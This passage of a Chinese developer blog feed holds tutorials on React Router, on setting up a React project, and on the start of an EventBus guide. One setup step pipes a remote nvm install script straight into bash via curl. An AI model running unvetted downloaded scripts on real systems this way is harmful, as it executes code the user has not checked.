        <content type="html"><![CDATA[<h1 id="什么是React-Router"><a href="#什么是React-Router" class="headerlink" title="什么是React  Router"></a>什么是React  Router</h1><p>许多现代网站实际上是由一个页面组成的，它们看起来就像多个页面，因为它们包含呈现为单独页面的组件。 这些通常称为SPA-单页应用程序。 从根本上说，React Router的作用是根据URL中使用的路由（在首页中为/，在About页面中为/ about等），有条件地渲染某些组件以进行显示。<br>例如我们可以通过React Router将 <a href="http://www.myurl.com/">www.myurl.com/</a>  与 <a href="http://www.myurl.com/about">www.myurl.com/about</a> 或者 <a href="http://www.myurl.com/shop">www.myurl.com/shop</a> 链接起来。<br>那怎么做到这些呢？先看下React Router的基本组件：</p><h4 id="React-Router-组件"><a href="#React-Router-组件" class="headerlink" title="React Router 组件"></a>React Router 组件</h4><p>现在的React Router版本中已不需要路由配置，现在一切皆组件。</p><p>ReactRouter中提供了以下三大组件：</p><ul><li><code>Router</code>是所有路由组件共用的底层接口组件，它是路由规则制定的最外层的容器。</li><li><code>Route</code>路由规则匹配，并显示当前的规则对应的组件。</li><li><code>Link</code>路由跳转的组件</li></ul><p>当然每个组件下又会有几种不同的子类组件实现。比如： Router组件就针对不同功能和平台对应用：</p><ul><li><code>&lt;BrowserRouter&gt;</code> 浏览器的路由组件</li><li><code>&lt;HashRouter&gt;</code> URL格式为Hash路由组件</li><li><code>&lt;MemoryRouter&gt;</code> 内存路由组件</li><li><code>&lt;NativeRouter&gt;</code> Native的路由组件</li><li><code>&lt;StaticRouter&gt;</code> 地址不改变的静态路由组件</li></ul><h1 id="React-Router-设计"><a href="#React-Router-设计" class="headerlink" title="React Router 设计"></a>React Router 设计</h1><ol><li>安装包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react-router-dom</span><br></pre></td></tr></table></figure></li><li>创建router, 参考<a href="https://reactrouter.com/web/example/basic">官方例子</a><br>在App.js 中放入以下代码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">import React from &#39;react&#39;;</span><br><span class="line">import &#123;</span><br><span class="line">  BrowserRouter as Router,</span><br><span class="line">  Switch,</span><br><span class="line">  Route,</span><br><span class="line">  Link</span><br><span class="line">&#125; from &quot;react-router-dom&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; This site has 3 pages, all of which are rendered</span><br><span class="line">&#x2F;&#x2F; dynamically in the browser (not server rendered).</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Although the page does not ever refresh, notice how</span><br><span class="line">&#x2F;&#x2F; React Router keeps the URL up to date as you navigate</span><br><span class="line">&#x2F;&#x2F; through the site. This preserves the browser history,</span><br><span class="line">&#x2F;&#x2F; making sure things like the back button and bookmarks</span><br><span class="line">&#x2F;&#x2F; work properly.</span><br><span class="line"></span><br><span class="line">export default function BasicExample() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;Router&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">          &lt;li&gt;</span><br><span class="line">            &lt;Link to&#x3D;&quot;&#x2F;&quot;&gt;Home&lt;&#x2F;Link&gt;</span><br><span class="line">          &lt;&#x2F;li&gt;</span><br><span class="line">          &lt;li&gt;</span><br><span class="line">            &lt;Link to&#x3D;&quot;&#x2F;about&quot;&gt;About&lt;&#x2F;Link&gt;</span><br><span class="line">          &lt;&#x2F;li&gt;</span><br><span class="line">          &lt;li&gt;</span><br><span class="line">            &lt;Link to&#x3D;&quot;&#x2F;dashboard&quot;&gt;Dashboard&lt;&#x2F;Link&gt;</span><br><span class="line">          &lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line"></span><br><span class="line">        &lt;hr &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">        &#123;&#x2F;*</span><br><span class="line">          A &lt;Switch&gt; looks through all its children &lt;Route&gt;</span><br><span class="line">          elements and renders the first one whose path</span><br><span class="line">          matches the current URL. Use a &lt;Switch&gt; any time</span><br><span class="line">          you have multiple routes, but you want only one</span><br><span class="line">          of them to render at a time</span><br><span class="line">        *&#x2F;&#125;</span><br><span class="line">        &lt;Switch&gt;</span><br><span class="line">          &lt;Route exact path&#x3D;&quot;&#x2F;&quot;&gt;</span><br><span class="line">            &lt;Home &#x2F;&gt;</span><br><span class="line">          &lt;&#x2F;Route&gt;</span><br><span class="line">          &lt;Route path&#x3D;&quot;&#x2F;about&quot;&gt;</span><br><span class="line">            &lt;About &#x2F;&gt;</span><br><span class="line">          &lt;&#x2F;Route&gt;</span><br><span class="line">          &lt;Route path&#x3D;&quot;&#x2F;dashboard&quot;&gt;</span><br><span class="line">            &lt;Dashboard &#x2F;&gt;</span><br><span class="line">          &lt;&#x2F;Route&gt;</span><br><span class="line">        &lt;&#x2F;Switch&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;Router&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; You can think of these components as &quot;pages&quot;</span><br><span class="line">&#x2F;&#x2F; in your app.</span><br><span class="line"></span><br><span class="line">function Home() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h2&gt;Home&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function About() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h2&gt;About&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Dashboard() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h2&gt;Dashboard&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>运行出来后的页面如下：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b4a535d2ccd161c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ol><p>点击about 跳转到/about 页面，如下<br><img src="https://upload-images.jianshu.io/upload_images/15531792-a538f9214f26be99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="React-Router-主要组件"><a href="#React-Router-主要组件" class="headerlink" title="React Router 主要组件"></a>React Router 主要组件</h1><p>React Router中的组件主要分为三类：</p><ul><li>路由器，例如<BrowserRouter>和<HashRouter></li><li>路由匹配器，例如<Route>和<Switch></li><li>导航，例如<Link>，<NavLink>和<Redirect></li></ul><p>将导航组件视为“路线更改器”，在Web应用程序中使用的所有组件都应从react-router-dom导入。</p><h4 id="Routers"><a href="#Routers" class="headerlink" title="Routers"></a>Routers</h4><p>每个React Router应用程序的核心应该是路由器组件。 对于Web项目，react-router-dom提供<BrowserRouter>和<HashRouter>路由器。 两者之间的主要区别是它们存储URL和与Web服务器通信的方式。</p><ul><li><BrowserRouter>使用常规URL路径。 这些通常是外观最好的URL，但是它们要求正确配置服务器。 具体来说，Web服务器需要在所有由React Router客户端管理的URL上提供相同的页面。 Create React App在开发中即开即用地支持此功能，并附带有关如何配置生产服务器的说明。</li><li><HashRouter>将当前位置存储在URL的哈希部分中，因此URL看起来类似于<a href="http://example.com/#/your/page%E3%80%82">http://example.com/#/your/page。</a> 由于哈希从不发送到服务器，因此这意味着不需要特殊的服务器配置。</li></ul><p>要使用路由器，只需确保将其呈现在元素层次结构的根目录下即可。 通常，您会将顶级<App>元素包装在路由器中，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import React from &quot;react&quot;;</span><br><span class="line">import ReactDOM from &quot;react-dom&quot;;</span><br><span class="line">import &#123; BrowserRouter &#125; from &quot;react-router-dom&quot;;</span><br><span class="line"></span><br><span class="line">function App() &#123;</span><br><span class="line">  return &lt;h1&gt;Hello React Router&lt;&#x2F;h1&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;BrowserRouter&gt;</span><br><span class="line">    &lt;App &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;BrowserRouter&gt;,</span><br><span class="line">  document.getElementById(&quot;root&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Route-Matchers"><a href="#Route-Matchers" class="headerlink" title="Route Matchers"></a>Route Matchers</h4><p>有两个router matcher: <code>Switch</code>和<code>Route</code>。如果使用了 <Switch>，它将搜索其子<Route>元素，以查找其路径与当前URL匹配的元素。 当找到一个时，它将渲染该<Route>并忽略所有其他路由。 这意味着应将有比较具体path匹配规则的<Route>放置在比较模糊匹配规则的<Route>前面。<br>如果没有<Route>匹配，则<Switch>不渲染任何内容（null）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import React from &quot;react&quot;;</span><br><span class="line">import ReactDOM from &quot;react-dom&quot;;</span><br><span class="line">import &#123;</span><br><span class="line">  BrowserRouter as Router,</span><br><span class="line">  Switch,</span><br><span class="line">  Route</span><br><span class="line">&#125; from &quot;react-router-dom&quot;;</span><br><span class="line"></span><br><span class="line">function App() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Switch&gt;</span><br><span class="line">        &#123;&#x2F;* If the current URL is &#x2F;about, this route is rendered</span><br><span class="line">            while the rest are ignored *&#x2F;&#125;</span><br><span class="line">        &lt;Route path&#x3D;&quot;&#x2F;about&quot;&gt;</span><br><span class="line">          &lt;About &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;Route&gt;</span><br><span class="line"></span><br><span class="line">        &#123;&#x2F;* Note how these two routes are ordered. The more specific</span><br><span class="line">            path&#x3D;&quot;&#x2F;contact&#x2F;:id&quot; comes before path&#x3D;&quot;&#x2F;contact&quot; so that</span><br><span class="line">            route will render when viewing an individual contact *&#x2F;&#125;</span><br><span class="line">        &lt;Route path&#x3D;&quot;&#x2F;contact&#x2F;:id&quot;&gt;</span><br><span class="line">          &lt;Contact &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;Route&gt;</span><br><span class="line">        &lt;Route path&#x3D;&quot;&#x2F;contact&quot;&gt;</span><br><span class="line">          &lt;AllContacts &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;Route&gt;</span><br><span class="line"></span><br><span class="line">        &#123;&#x2F;* If none of the previous routes render anything,</span><br><span class="line">            this route acts as a fallback.</span><br><span class="line"></span><br><span class="line">            Important: A route with path&#x3D;&quot;&#x2F;&quot; will *always* match</span><br><span class="line">            the URL because all URLs begin with a &#x2F;. So that&#39;s</span><br><span class="line">            why we put this one last of all *&#x2F;&#125;</span><br><span class="line">        &lt;Route path&#x3D;&quot;&#x2F;&quot;&gt;</span><br><span class="line">          &lt;Home &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;Route&gt;</span><br><span class="line">      &lt;&#x2F;Switch&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;Router&gt;</span><br><span class="line">    &lt;App &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;Router&gt;,</span><br><span class="line">  document.getElementById(&quot;root&quot;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>需要注意的是<Route path>匹配URL的开头，而不是整个开头。 因此，&lt;Route path =“ /”&gt;将始终与URL匹配。 因此，我们通常将此<Route>放在<Switch>的最后。 另一种可能的解决方案是使用匹配整个URL的 <Route exact path="/">。注意：尽管React Router确实支持在<Switch>之外渲染<Route>元素，但从5.1版本开始，我们建议使用useRouteMatch hook代替。 此外，我们不建议呈现不带路径的<Route>，而是建议使用hook来访问所需的任何变量。</p><h4 id="Navigation-or-Route-Changers"><a href="#Navigation-or-Route-Changers" class="headerlink" title="Navigation (or Route Changers)"></a>Navigation (or Route Changers)</h4><p>React Router提供了一个<Link>组件来在应用程序中创建链接。 无论在何处render<Link>，都会在HTML文档中渲染anchor(<a>)<br><NavLink>是<Link>的一种特殊类型，当其prop与当前位置匹配时，可以将其自身设置为“active”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;Link to&#x3D;&quot;&#x2F;&quot;&gt;Home&lt;&#x2F;Link&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;&#x2F;&quot;&gt;Home&lt;&#x2F;a&gt;</span><br><span class="line">&lt;NavLink to&#x3D;&quot;&#x2F;react&quot; activeClassName&#x3D;&quot;hurray&quot;&gt;</span><br><span class="line">  React</span><br><span class="line">&lt;&#x2F;NavLink&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; When the URL is &#x2F;react, this renders:</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;&#x2F;react&quot; className&#x3D;&quot;hurray&quot;&gt;React&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; When it&#39;s something else:</span><br><span class="line">&#x2F;&#x2F; &lt;a href&#x3D;&quot;&#x2F;react&quot;&gt;React&lt;&#x2F;a&gt;</span><br><span class="line">&lt;Redirect to&#x3D;&quot;&#x2F;login&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>任何时候要强制navigation，都可以使用<Redirect>。 声依永<Redirect>时，它将使用其 to prop进行导航。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.jianshu.com/p/6583b7258e78">React Router 教程</a></li><li><a href="https://www.freecodecamp.org/news/react-router-in-5-minutes/">Learn React Router in 5 Minutes - A Beginner’s Tutorial</a></li><li><a href="https://reactrouter.com/web/guides/quick-start">React Router 官方文档</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建一个react 项目</title>
      <link href="/2021/01/07/%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAreact-%E9%A1%B9%E7%9B%AE/"/>
      <url>/2021/01/07/%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAreact-%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h1><ol><li>安装nvm(以下均在mac上面)<br>nvm 是用来安装和管理node的工具，可以在不同的node版本之间切换<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;creationix&#x2F;nvm&#x2F;v0.33.0&#x2F;install.sh | bash</span><br></pre></td></tr></table></figure>安装完成后用一下命令检查nvm是否安装成功<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm --version</span><br></pre></td></tr></table></figure>返回nvm的版本号</li><li>安装node<br>安装最新版本的node<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;安装最新版本的node</span><br><span class="line">nvm install node</span><br><span class="line">&#x2F;&#x2F;列出所有安装的node版本</span><br><span class="line">nvm list</span><br><span class="line">        v8.17.0</span><br><span class="line">       v10.13.0</span><br><span class="line">       v10.15.0</span><br><span class="line">       v10.15.3</span><br><span class="line">       v12.18.3</span><br><span class="line">        v15.2.1</span><br><span class="line">&#x2F;&#x2F;使用制定版本的node</span><br><span class="line">nvm use v15.2.1</span><br></pre></td></tr></table></figure></li><li>安装yarn<br>npm是和node一起安装的一个包，用npm来安装yarn<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g yarn</span><br><span class="line">$ yarn -v</span><br></pre></td></tr></table></figure></li><li>安装脚手架工具<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g create-react-app</span><br></pre></td></tr></table></figure><h1 id="创建react-项目"><a href="#创建react-项目" class="headerlink" title="创建react 项目"></a>创建react 项目</h1></li><li>创建项目<br>创建之前下检查下node和npm的版本(create-react-app要求 Node &gt;= 6 和 npm &gt;= 5.2)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure>在命令行终端里面cd到新项目的文件夹，然后执行以下命令创建项目<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create-react-app first_react</span><br></pre></td></tr></table></figure>用tree命令查看创建的项目的文件夹内容如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">first_react</span><br><span class="line">├── node_modules</span><br><span class="line">├── README.md</span><br><span class="line">├── package.json</span><br><span class="line">├── public</span><br><span class="line">│   ├── favicon.ico</span><br><span class="line">│   ├── index.html</span><br><span class="line">│   ├── logo192.png</span><br><span class="line">│   ├── logo512.png</span><br><span class="line">│   ├── manifest.json</span><br><span class="line">│   └── robots.txt</span><br><span class="line">├── src</span><br><span class="line">│   ├── App.css</span><br><span class="line">│   ├── App.js</span><br><span class="line">│   ├── App.test.js</span><br><span class="line">│   ├── index.css</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   ├── logo.svg</span><br><span class="line">│   ├── reportWebVitals.js</span><br><span class="line">│   └── setupTests.js</span><br><span class="line">└── yarn.lock</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>node_modules里面的内容太多没有列出<br>2. 运行项目<br>cd 到项目文件夹里面，然后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">npm start 或者 yarn start</span><br><span class="line">&#x2F;&#x2F;命令行输出如下：</span><br><span class="line">Compiled successfully!</span><br><span class="line"></span><br><span class="line">You can now view first_react in the browser.</span><br><span class="line"></span><br><span class="line">  Local:            http:&#x2F;&#x2F;localhost:3000</span><br><span class="line">  On Your Network:  http:&#x2F;&#x2F;192.168.0.228:3000</span><br><span class="line"></span><br><span class="line">Note that the development build is not optimized.</span><br><span class="line">To create a production build, use yarn build.</span><br></pre></td></tr></table></figure><p>然后浏览器自动打开，出现如下画面：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-c730bdc7d9f24b45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>说明react项目成功了，可以用vscode 打开first_react项目进行开发了</p><p>参考: <a href="https://www.cnblogs.com/liu-jinxin/p/10855924.html">创建第一个react项目</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EventBus 使用及原理</title>
      <link href="/2021/01/02/EventBus-%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8E%9F%E7%90%86/"/>
      <url>/2021/01/02/EventBus-%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>转自<a href="https://zhuanlan.zhihu.com/p/77809630">Android面试之EventBus原理分析</a><br><a href="https://zhuanlan.zhihu.com/p/20871335">【Bugly分享】老司机教你 “飙” EventBus 3</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>众所周知，EventBus 是一款用在 Android 开发中的发布/订阅事件总线框架，基于观察者模式，将事件的接收者和发送者分开，简化了组件之间的通信操作，使用简单、效率高、体积小！</p><p>EventBus使用了典型的发布/订阅事件模式，下面是 EventBus官方给出的原理示意图。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-266dddd763829800.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>使用EventBus之前，需要先添加EventBus依赖，EventBus支持gradle和maven两种方式依赖，gradle依赖的脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation &#39;org.greenrobot:eventbus:3.1.1&#39;</span><br></pre></td></tr></table></figure><p>maven依赖的配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.greenrobot&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;eventbus&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.1.1&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>EventBus的使用步骤分为定义事件、订阅事件、发送事件、处理事件、取消订阅五步。 1，首先，定义一个事件类，里面添加需要发送的数据内容，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static class MessageEvent &#123;</span><br><span class="line"> &#x2F;* Additional fields if needed *&#x2F; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>2，然后，在需要接收事件的地方订阅事件，可以选择注册事件订阅方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@Subscribe(threadMode &#x3D; ThreadMode.MAIN)  </span><br><span class="line">public void onMessageEvent(MessageEvent event) &#123;</span><br><span class="line">&#x2F;* Do something *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为了不造成资源的浪费或其他问题，需要在onStart函数中注册订阅事件，然后再onStop函数中取消订阅事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line"> public void onStart() &#123;</span><br><span class="line">     super.onStart();</span><br><span class="line">     EventBus.getDefault().register(this);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> @Override</span><br><span class="line"> public void onStop() &#123;</span><br><span class="line">     super.onStop();</span><br><span class="line">     EventBus.getDefault().unregister(this);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>3，最后，将处理完成的数据发送出去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventBus.getDefault().post(new MessageEvent());</span><br></pre></td></tr></table></figure><h2 id="EventBus原理剖析"><a href="#EventBus原理剖析" class="headerlink" title="EventBus原理剖析"></a>EventBus原理剖析</h2><p>要理解EventBus背后的原理，可以从以下几个方面着手： - Subscribe注解 - 注册事件订阅方法 - 取消注册 - 发送事件 - 事件处理 - 粘性事件 - Subscriber Index - 流程梳理</p><h2 id="Subscribe注解"><a href="#Subscribe注解" class="headerlink" title="Subscribe注解"></a>Subscribe注解</h2><p>EventBus从3.0开始使用Subscribe注解配置事件订阅方法，不再使用方法名，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@Subscribe</span><br><span class="line">public void handleEvent(String event) &#123;</span><br><span class="line">    &#x2F;&#x2F; do something</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，事件类型可以是 Java 中已有的类型或者自定义的类型。下面是Subscribe注解的具体实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Documented</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(&#123;ElementType.METHOD&#125;)</span><br><span class="line">public @interface Subscribe &#123;</span><br><span class="line">    &#x2F;&#x2F; 指定事件订阅方法的线程模式，即在那个线程执行事件订阅方法处理事件，默认为POSTING</span><br><span class="line">    ThreadMode threadMode() default ThreadMode.POSTING;</span><br><span class="line">    &#x2F;&#x2F; 是否支持粘性事件，默认为false</span><br><span class="line">    boolean sticky() default false;</span><br><span class="line">    &#x2F;&#x2F; 